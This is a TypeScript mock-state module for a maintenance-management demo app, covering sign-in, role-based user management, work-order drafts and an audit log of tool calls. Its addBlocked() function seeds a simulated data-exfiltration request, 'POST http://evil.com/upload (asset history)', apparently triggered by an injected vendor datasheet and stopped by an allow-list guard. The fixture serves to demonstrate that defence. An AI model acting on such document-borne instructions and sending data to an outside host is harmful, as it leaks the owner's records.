// Mutable demo state (mock mode only): signed-in user, accounts, documents, audit log,
// blocked attempts. Mirrors what the backend will keep in SQLite.

import { sha256 } from '../lib/sha256'
import { canManageRole, ROLE_BY_ID, ROLES, type RoleId } from '../lib/roles'
import { toAsset, toBadActor } from './adapters'
import { emit } from './events'
import { assets, badActors } from './mock'
import type {
  AuditEntry,
  AuditStatus,
  BlockedAttempt,
  DocumentItem,
  NewUser,
  UserAccount,
  WorkOrderDraft,
} from './types'

const now = () => new Date().toISOString()
const minutesAgo = (m: number) => new Date(Date.now() - m * 60_000).toISOString()
const daysAgo = (d: number, h = 11) => {
  const t = new Date()
  t.setDate(t.getDate() - d)
  t.setHours(h, 5, 0, 0)
  return t.toISOString()
}

let seq = 100
const id = (p: string) => `${p}-${++seq}`

// =====================================================================================
// Accounts and session
// =====================================================================================

/** Password for every seeded demo account (shown on the sign-in screen in demo mode). */
export const DEMO_PASSWORD = 'demo123'

interface StoredUser extends UserAccount {
  salt: string
  password_hash: string
}

const hashPassword = (salt: string, password: string) => sha256(`${salt}:${password}`)

/** One demo account per role, e.g. a.rao (Reliability Engineer). */
const SEED_USERS: StoredUser[] = ROLES.map((r, i) => {
  const username = r.user.toLowerCase().replace(/\s+/g, '').replace(/[^a-z.]/g, '')
  const salt = `seed-${i}`
  return {
    username,
    name: r.user,
    role: r.id,
    added_by: null,
    created_at: '2026-11-01T09:00:00.000Z',
    salt,
    password_hash: hashPassword(salt, DEMO_PASSWORD),
  }
})

const USERS_KEY = 'ps-demo-users' // accounts added in demo mode survive a page refresh

function loadAdded(): StoredUser[] {
  try {
    const raw = localStorage.getItem(USERS_KEY)
    return raw ? (JSON.parse(raw) as StoredUser[]) : []
  } catch {
    return []
  }
}

let added: StoredUser[] = loadAdded()

function saveAdded() {
  try {
    localStorage.setItem(USERS_KEY, JSON.stringify(added))
  } catch {
    /* storage unavailable: accounts last for this session only */
  }
}

const allUsers = (): StoredUser[] => [...SEED_USERS, ...added]
const publicUser = ({ salt: _s, password_hash: _h, ...u }: StoredUser): UserAccount => u

let current: UserAccount | null = null

export function getSession(): { role: RoleId | ''; user: string; username: string } {
  return current
    ? { role: current.role as RoleId, user: current.name, username: current.username }
    : { role: '', user: 'Not signed in', username: '' }
}

export function setCurrentUser(u: UserAccount | null) {
  current = u
}

export function findUser(username: string): UserAccount | null {
  const u = allUsers().find((x) => x.username === username)
  return u ? publicUser(u) : null
}

/** Returns the account, or null for a wrong username/password (both logged). */
export function signIn(username: string, password: string): UserAccount | null {
  const u = allUsers().find((x) => x.username === username.trim().toLowerCase())
  const ok = Boolean(u && u.password_hash === hashPassword(u.salt, password))
  const status: AuditStatus = ok ? 'allowed' : 'blocked'
  audit.push({
    id: id('a'),
    at: now(),
    user: u?.name ?? username,
    role: u?.role ?? '',
    tool: 'sign_in',
    input: `username=${username}`,
    output: ok ? 'signed in' : 'wrong username or password',
    status,
  })
  emit('audit')
  if (!ok || !u) return null
  current = publicUser(u)
  return current
}

/** Demo switcher: become a seeded demo account without a password (never a manager-added one). */
export function switchTo(username: string): UserAccount | null {
  const u = SEED_USERS.find((x) => x.username === username)
  if (!u) return null
  const from = current?.username ?? '—'
  current = publicUser(u)
  logAudit('switch_user', `${from} → ${u.username}`, 'demo switch')
  return current
}

export function signOut() {
  if (current) logAudit('sign_out', `username=${current.username}`, 'signed out')
  current = null
}

export function listUsers(): UserAccount[] {
  return allUsers().map(publicUser)
}

export function createUser(input: NewUser): UserAccount {
  if (!current) throw new Error('Sign in first')
  const role = input.role as RoleId
  if (!ROLE_BY_ID[role]) throw new Error('Unknown role')
  if (!canManageRole(current.role as RoleId, role)) {
    logAudit('create_user', `role=${role}`, 'not allowed', 'blocked')
    throw new Error(`${ROLE_BY_ID[current.role as RoleId].label} can't add a ${ROLE_BY_ID[role].label}`)
  }
  const username = input.username.trim().toLowerCase()
  if (!/^[a-z][a-z0-9._-]{2,31}$/.test(username)) throw new Error('Username: 3–32 characters, letters, digits, dots')
  if (allUsers().some((u) => u.username === username)) throw new Error('That username is taken')
  if (input.password.length < 8) throw new Error('Password must be at least 8 characters')
  const salt = Math.random().toString(36).slice(2)
  const user: StoredUser = {
    username,
    name: input.name.trim(),
    role,
    added_by: current.username,
    created_at: now(),
    salt,
    password_hash: hashPassword(salt, input.password),
  }
  added = [...added, user]
  saveAdded()
  logAudit('create_user', `${username} as ${ROLE_BY_ID[role].label}`, 'account created')
  emit('users')
  return publicUser(user)
}

export function removeUser(username: string): void {
  if (!current) throw new Error('Sign in first')
  const target = added.find((u) => u.username === username)
  if (!target) throw new Error('Demo accounts can’t be removed')
  if (target.username === current.username) throw new Error('You can’t remove yourself')
  if (!canManageRole(current.role as RoleId, target.role as RoleId)) {
    logAudit('remove_user', username, 'not allowed', 'blocked')
    throw new Error('You can only remove people below you')
  }
  added = added.filter((u) => u.username !== username)
  saveAdded()
  logAudit('remove_user', username, 'account removed')
  emit('users')
}

// =====================================================================================
// Documents
// =====================================================================================

const RE = 'A. Rao'
const MGR = 'S. Kulkarni'

function woDraft(over: Partial<WorkOrderDraft> & Pick<WorkOrderDraft, 'wo_number' | 'tag' | 'asset_name'>): WorkOrderDraft {
  return {
    priority: 'Medium',
    problem: '',
    suspected_cause: '',
    recommended_steps: '',
    parts: 'Confirm after inspection.',
    safety: 'Follow approved isolation (LOTO) procedure.',
    references: '',
    requested_by: RE,
    date: new Date().toISOString().slice(0, 10),
    status: 'draft',
    ...over,
  }
}

const documents: DocumentItem[] = [
  {
    id: 'doc-13',
    file_name: 'WO-2026-013.docx',
    kind: 'work_order',
    tag: 'C-203',
    created_by: RE,
    created_at: daysAgo(1, 16),
    work_order: woDraft({
      wo_number: 'WO-2026-013',
      tag: 'C-203',
      asset_name: 'Recycle gas compressor',
      priority: 'High',
      problem: 'Bearing overheating: 3 events in 180 days, gap between failures down from 300 to 60 days.',
      suspected_cause: 'Poor heat dissipation at the NDE bearing; check lube oil condition and cooler.',
      recommended_steps: 'Sample and replace lube oil; clean oil cooler; trend bearing temperature for 2 weeks.',
      references: 'Compressor manual p. 41; work orders WO-0427, WO-0450, WO-0478.',
      status: 'approved',
      approved_by: MGR,
    }),
  },
  {
    id: 'doc-12',
    file_name: 'WO-2026-012.docx',
    kind: 'work_order',
    tag: 'E-302',
    created_by: RE,
    created_at: daysAgo(3, 10),
    work_order: woDraft({
      wo_number: 'WO-2026-012',
      tag: 'E-302',
      asset_name: 'VDU preheat exchanger',
      problem: 'Fouling: 3 cleanings in 180 days, poor heat transfer and high DP.',
      suspected_cause: 'Heavy feed increasing deposit rate.',
      recommended_steps: 'Schedule hydro-jet cleaning at next opportunity; review antifoulant dosing.',
      references: 'SOP exchanger cleaning p. 2; work orders WO-0417, WO-0447, WO-0472.',
      status: 'approved',
      approved_by: MGR,
    }),
  },
  {
    id: 'doc-11',
    file_name: 'bad-actor-report-2026-11-07.xlsx',
    kind: 'bad_actor_report',
    tag: null,
    created_by: RE,
    created_at: daysAgo(7, 9),
  },
]
let woCounter = 13

export function listDocuments(): DocumentItem[] {
  return documents.slice().sort((a, b) => b.created_at.localeCompare(a.created_at))
}

export function addWorkOrder(tag: string): DocumentItem {
  woCounter += 1
  const wo = `WO-2026-${String(woCounter).padStart(3, '0')}`
  const raw = assets.find((a) => a.tag === tag)
  const asset = raw ? toAsset(raw) : undefined
  const rowRaw = badActors.find((b) => b.tag === tag)
  const row = rowRaw ? toBadActor(rowRaw, asset, 1) : undefined
  const user = getSession().user
  const draft =
    tag === 'P-101'
      ? woDraft({
          wo_number: wo,
          tag,
          asset_name: 'Feed pump',
          priority: 'High',
          problem: 'Repeated mechanical seal leakage: 4 failures in 180 days; gap between failures down from 150 to 51 days.',
          suspected_cause: 'Shaft misalignment (0.3 mm found on 12 Nov 2026); verify on inspection.',
          recommended_steps:
            'Laser-align pump and motor shafts to within 0.05 mm; check seal and bearings; verify seal flush plan; record findings.',
          references: 'Inspection IR-2026-118 p. 2; pump manual p. 18; work orders WO-0423, WO-0441, WO-0465, WO-0486.',
          requested_by: user,
        })
      : woDraft({
          wo_number: wo,
          tag,
          asset_name: asset?.name ?? tag,
          priority: asset?.criticality ?? 'Medium',
          problem: row ? `${row.failure_mode}: ${row.events} event(s) in 180 days.` : 'Describe the problem.',
          suspected_cause: 'To be confirmed on inspection.',
          recommended_steps: 'Inspect, repair as found and record findings.',
          references: `${tag} work-order history.`,
          requested_by: user,
        })
  const doc: DocumentItem = {
    id: id('doc'),
    file_name: `${wo}.docx`,
    kind: 'work_order',
    tag,
    created_by: user,
    created_at: now(),
    work_order: draft,
  }
  documents.push(doc)
  emit('documents')
  return doc
}

export function addBadActorReport(): DocumentItem {
  const doc: DocumentItem = {
    id: id('doc'),
    file_name: `bad-actor-report-${new Date().toISOString().slice(0, 10)}.xlsx`,
    kind: 'bad_actor_report',
    tag: null,
    created_by: getSession().user,
    created_at: now(),
  }
  documents.push(doc)
  emit('documents')
  return doc
}

export function approveWorkOrder(docId: string): void {
  const doc = documents.find((d) => d.id === docId)
  if (!doc?.work_order) return
  doc.work_order = { ...doc.work_order, status: 'approved', approved_by: getSession().user }
  logAudit('approve_work_order', doc.work_order.wo_number, 'approved')
  emit('documents')
}

export function updateWorkOrder(docId: string, draft: WorkOrderDraft): void {
  const doc = documents.find((d) => d.id === docId)
  if (doc) {
    doc.work_order = draft
    emit('documents')
  }
}

// =====================================================================================
// Audit log
// =====================================================================================

const audit: AuditEntry[] = [
  { id: id('a'), at: minutesAgo(52), user: RE, role: 'reliability_engineer', tool: 'get_bad_actors', input: 'top_n=10', output: '10 rows', status: 'allowed' },
  { id: id('a'), at: minutesAgo(47), user: 'K. Singh', role: 'technician', tool: 'get_asset_history', input: 'tag=C-203', output: '25 work orders', status: 'allowed' },
  { id: id('a'), at: minutesAgo(45), user: 'K. Singh', role: 'technician', tool: 'export_report', input: 'type=bad_actors', output: 'Not allowed for Technician', status: 'blocked' },
  { id: id('a'), at: minutesAgo(31), user: RE, role: 'reliability_engineer', tool: 'search_manuals', input: 'compressor bearing overheating', output: '3 passages', status: 'allowed' },
]

export function logAudit(tool: string, input: string, output: string, status: AuditStatus = 'allowed'): void {
  const { user, role } = getSession()
  audit.push({ id: id('a'), at: now(), user, role, tool, input, output, status })
  emit('audit')
}

export function listAudit(): AuditEntry[] {
  return audit.slice().sort((a, b) => b.at.localeCompare(a.at))
}

// =====================================================================================
// Blocked attempts
// =====================================================================================

const blocked: BlockedAttempt[] = []

export function addBlocked(): BlockedAttempt {
  const attempt: BlockedAttempt = {
    id: id('b'),
    at: now(),
    tool: 'external_request',
    target: 'evil.com',
    source: 'vendor_seal_datasheet.pdf',
    reason: 'Not on allow-list',
  }
  blocked.push(attempt)
  logAudit('external_request', 'POST http://evil.com/upload (asset history)', 'Blocked by guard', 'blocked')
  emit('blocked')
  return attempt
}

export function listBlocked(): BlockedAttempt[] {
  return blocked.slice().sort((a, b) => b.at.localeCompare(a.at))
}
